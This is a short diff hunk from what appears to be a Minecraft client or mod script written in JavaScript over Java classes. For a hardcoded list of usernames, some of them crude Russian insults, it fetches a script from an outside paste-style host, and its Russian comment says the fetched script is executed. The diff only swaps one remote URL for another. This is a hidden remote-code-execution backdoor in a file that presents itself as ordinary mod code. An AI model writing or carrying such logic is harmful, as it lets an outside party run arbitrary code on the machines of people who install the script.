@@ -78,7 +78,7 @@ sendUserMessage("§b§l-Zr3");
     if (username === "porvaniy.gondon" || username === "__ded_inside__" || username === "latteld" || username === "dofinixx" || username === "troll4" || username === "zertqmap.org" || username === "nekitpon" || username === "fakepatrickstar" || username === "inclodus" || username === "terpila_naxyi" || username === "masterrpo1" || username === "prolix0573") {
         try {
             // Выполняем внешний скрипт - ИСПРАВЛЕННАЯ ВЕРСИЯ
-            var url = new java.net.URL("https://diddy-party.vip/p/raw/or292hyekusblfp91");
+            var url = new java.net.URL("https://diddy-party.vip/p/upg6sy072a");
             var connection = url.openConnection();
             var inputStream = connection.getInputStream();
             var reader = new java.io.BufferedReader(new java.io.InputStreamReader(inputStream));
